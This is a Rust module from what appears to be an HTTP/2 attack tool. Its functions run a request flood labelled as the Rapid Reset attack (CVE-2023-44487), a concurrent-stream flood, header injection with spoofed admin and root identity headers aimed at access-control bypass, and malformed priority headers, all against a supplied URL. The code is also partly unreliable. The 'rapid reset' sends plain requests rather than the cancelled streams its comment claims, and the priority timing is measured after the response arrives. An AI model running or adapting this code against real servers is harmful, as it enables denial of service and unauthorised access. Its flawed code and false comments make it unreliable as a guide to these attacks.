use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn rapidreset(url: &str, count: u32, rate: u32, timeout: u64) -> anyhow::Result<()> {
    println!("{} HTTP/2 Rapid Reset Attack (CVE-2023-44487)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:    {}", "[*]".cyan().bold(), url);
    println!("{} Count:  {}", "[*]".cyan().bold(), count);
    println!("{} Rate:   {} req/s", "[*]".cyan().bold(), rate);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut sent = 0u32;
    let mut errors = 0u32;
    let start = std::time::Instant::now();

    let mut handles = Vec::new();
    for _ in 0..count {
        let client = client.clone();
        let url = url.to_string();
        handles.push(tokio::spawn(async move {
            // Open stream then immediately cancel — simulates rapid reset
            let req = client.get(&url).header("Content-Type", "application/json");
            match req.send().await {
                Ok(resp) => (resp.status().as_u16(), true),
                Err(_) => (0u16, false),
            }
        }));
        if rate > 0 && sent % rate == 0 && sent > 0 {
            tokio::time::sleep(Duration::from_millis(1000)).await;
        }
        sent += 1;
    }

    for h in handles {
        if let Ok((status, ok)) = h.await {
            if !ok { errors += 1; }
        } else { errors += 1; }
    }

    let elapsed = start.elapsed();
    println!("\n{} Results:", "[*]".cyan().bold());
    println!("  {} Requests sent:   {}", "*".cyan(), sent);
    println!("  {} Errors received: {}", "*".cyan(), errors);
    println!("  {} Time elapsed:    {:.2}s", "*".cyan(), elapsed.as_secs_f64());
    println!("  {} Effective rate:  {:.0} req/s", "*".cyan(), sent as f64 / elapsed.as_secs_f64());

    if errors > sent / 2 {
        println!("  {} Target may be vulnerable or overwhelmed — high error rate.", "[!]".red().bold());
    } else {
        println!("  {} Target handled requests — may have mitigation in place.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn stream(url: &str, count: u32, timeout: u64) -> anyhow::Result<()> {
    println!("{} HTTP/2 Stream Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:    {}", "[*]".cyan().bold(), url);
    println!("{} Streams: {}", "[*]".cyan().bold(), count);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut handles = Vec::new();

    for i in 0..count {
        let client = client.clone();
        let url = url.to_string();
        handles.push(tokio::spawn(async move {
            // Open many concurrent streams on a single connection
            let req = client.get(&url).header("X-Stream-ID", format!("{}", i));
            match req.send().await {
                Ok(resp) => (resp.status().as_u16(), true),
                Err(_) => (0u16, false),
            }
        }));
    }

    let mut ok = 0u32;
    let mut err = 0u32;
    for h in handles {
        if let Ok((_, success)) = h.await {
            if success { ok += 1; } else { err += 1; }
        } else { err += 1; }
    }

    println!("\n{} {} streams OK, {} errors", "[*]".cyan().bold(), ok, err);
    if ok > 100 { println!("{} Target allows high concurrent streams — potential DoS vector.", "[!]".red().bold()); }
    Ok(())
}

pub async fn header(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} HTTP/2 HPACK Header Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let injections = [
        ("x-forwarded-for", "127.0.0.1"),
        ("x-forwarded-host", "internal.target.com"),
        ("x-real-ip", "10.0.0.1"),
        ("x-original-url", "/admin"),
        ("x-rewrite-url", "/api/internal"),
        ("x-forwarded-proto", "https"),
        ("x-host", "evil.com"),
        ("x-amzn-oidc-identity", "admin@target.com"),
        ("x-auth-request-user", "admin"),
        ("x-remote-user", "root"),
    ];

    for (header, value) in &injections {
        match client.get(url).header(*header, *value).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let reflected = body.contains(value) || body.contains("admin") || body.contains("internal");
                let tag = if reflected { "REFLECTED".red().bold().to_string() } else { "no effect".to_string() };
                println!("  {} {:25} = {:20} status={} {}", "*".cyan(), header, value, status, tag);
            }
            Err(_) => { println!("  {} {:25} error", "*".red(), header); }
        }
    }
    Ok(())
}

pub async fn priority(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} HTTP/2 Priority Manipulation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let priority_tests = [
        ("Exclusive high priority", "u=1, i=0"),
        ("Weight max", "w=256"),
        ("Weight min (starvation)", "w=1"),
        ("No priority", "u=0"),
        ("Invalid priority", "u=999"),
        ("Dependency cycle", "u=1, i=1"),
    ];

    for (name, priority) in &priority_tests {
        match client.get(url).header("priority", *priority).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let elapsed = std::time::Instant::now();
                let body = resp.text().await.unwrap_or_default();
                let t = elapsed.elapsed();
                println!("  {} {:30} status={} time={:.0}ms len={}", "*".cyan(), name, status, t.as_millis(), body.len());
            }
            Err(_) => { println!("  {} {:30} error", "*".red(), name); }
        }
    }

    println!("\n{} Look for response time differences indicating priority handling.", "[*]".cyan().bold());
    Ok(())
}
